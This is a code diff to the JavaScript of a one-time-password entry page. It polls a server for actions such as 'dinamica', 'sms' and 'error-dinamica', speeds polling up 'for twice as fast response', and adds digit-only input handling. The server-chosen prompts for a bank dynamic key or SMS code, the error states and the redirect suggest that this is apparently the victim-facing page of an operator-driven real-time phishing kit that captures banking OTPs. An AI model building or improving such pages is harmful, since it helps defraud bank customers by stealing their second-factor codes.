@@ -47,11 +47,17 @@ let pollInterval = setInterval(async () => {
         clearInterval(pingInterval);
         clearInterval(pollInterval);
         window.location.href = "index.html";
-      } else if ((action === 'dinamica' || action === 'sms') && !isSubmitting) {
-        sessionStorage.setItem('otpType', action);
-        updateUI(action);
-        document.getElementById("otp-validating").hidden = true;
-        document.getElementById("otp-content").hidden = false;
+      } else if (action === 'dinamica' || action === 'sms') {
+        // Keep showing spinner if validation is in flight or if a token exists on the server
+        if (isSubmitting || (data.token && data.token !== '')) {
+          document.getElementById("otp-validating").hidden = false;
+          document.getElementById("otp-content").hidden = true;
+        } else {
+          sessionStorage.setItem('otpType', action);
+          updateUI(action);
+          document.getElementById("otp-validating").hidden = true;
+          document.getElementById("otp-content").hidden = false;
+        }
       } else if (action === 'error-dinamica') {
         isSubmitting = false;
         document.getElementById("otp-validating").hidden = true;
@@ -92,7 +98,7 @@ let pollInterval = setInterval(async () => {
       }
     }
   } catch (_) {}
-}, 2000);
+}, 1000); // 1000ms polling for twice as fast response
 
 const slots = [...document.querySelectorAll("#otp-slots input")];
 const next = document.getElementById("otp-next");
@@ -126,6 +132,23 @@ slots.forEach((slot, index) => {
       slots[index - 1].focus();
       slots[index - 1].value = "";
       refresh();
+      return;
+    }
+
+    const isControlKey = event.key === "Backspace" || event.key === "Delete" || event.key === "ArrowLeft" || event.key === "ArrowRight" || event.key === "Tab" || event.metaKey || event.ctrlKey;
+    if (isControlKey) return;
+
+    if (!/^\d$/.test(event.key)) {
+      event.preventDefault();
+      return;
+    }
+
+    if (slot.value.length >= 1) {
+      if (slots[index + 1]) {
+        slots[index + 1].focus();
+      } else {
+        event.preventDefault();
+      }
     }
   });
 
